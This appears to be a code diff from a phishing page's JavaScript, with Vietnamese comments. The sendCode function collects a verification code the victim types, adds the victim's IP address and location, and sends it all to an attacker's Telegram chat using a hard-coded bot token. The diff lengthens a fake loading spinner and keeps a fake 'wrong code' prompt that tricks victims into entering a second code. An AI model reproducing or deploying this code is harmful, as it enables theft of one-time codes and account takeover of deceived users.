@@ -150,16 +150,14 @@ let Fcode='';
 function sendCode() {
     $('#code').on('input', function () {
         const input = $(this).val();
-        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng
+        const validInputRegex = /^\d+$/;
 
         if (!validInputRegex.test(input)) {
-            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
             $(this).val(input.slice(0, -1));
         }
     });
 
     $('#send-code').on('click', function () {
-
         const keymap = $("#code").val();
 
         if (keymap === '') {
@@ -168,39 +166,38 @@ function sendCode() {
         } else {
             $('#code').removeClass('border-danger');
         }
-        code1=keymap;
-        const message1   = 
-        '%0A<strong>Code: </strong>'+code1+
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
 
+        code1 = keymap;
 
+        const message1 = 
+            '%0A<strong>Code: </strong>' + code1 +
+            '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
+            '%0A<strong>Country : </strong>' + IpAddress.countryName + ' (' + IpAddress.countryCode + ')' +
+            '%0A<strong>City : </strong>' + IpAddress.city;
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
-        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
+        const chatId = '-1002416068664';
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message1}&parse_mode=html`;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
+        // Hiện loading ngay lập tức
+        $('.lsd-ring-container').removeClass('d-none');
 
         fetch(telegramUrl)
             .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
+                if (!response.ok) throw new Error('Network response was not ok');
                 return response.json();
             })
             .then(data => {
-                
+                // Sau 20 giây mới ẩn loading và xử lý tiếp
                 setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
+                    if (NUMBER_TIME_SEND_CODE === 1) {
                         $('#wrong-code').removeClass('d-none');
-                    }else{
+                    } else {
                         $('#getCode').removeClass('d-none');
                     }
                     $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
+                }, 20000); // 20 giây
             })
             .catch(error => {
                 setTimeout(function () {
@@ -211,6 +208,9 @@ function sendCode() {
                     $('.lsd-ring-container').addClass('d-none');
                 }, 500);
             });
+    });
+}
+
       /*  $.ajax({
             url: '/sendInfo',
             type: 'POST',
